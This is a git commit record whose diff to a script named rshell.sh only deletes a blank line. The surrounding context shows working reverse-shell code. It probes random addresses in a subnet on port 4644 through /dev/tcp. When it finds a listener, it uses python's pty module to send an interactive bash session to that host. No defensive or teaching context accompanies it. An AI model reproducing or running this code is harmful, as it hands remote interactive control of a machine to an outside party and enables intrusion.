2ac7f5de905b0f6445129ff38572b1c69e98d20a
bobby-boy49 <63045905+bobby-boy49@users.noreply.github.com>
2026-02-07 11:07:30 -0500

    Update rshell.sh

--- rshell.sh
+++ rshell.sh
@@ -6,7 +6,6 @@ port='4644'
 shell() {
 for i in $(seq 100 255 | shuf); do
   com="${ip}.${i}"
-
 if timeout 0.1 bash -c "true > /dev/tcp/$com/$port" 2>/dev/null; then
    sleep 2.5
    python3 -c 'import pty,os; os.environ["TERM"]="xterm"; pty.spawn(["/bin/bash", "-i"])' >& /dev/tcp/$com/$port 0>&1
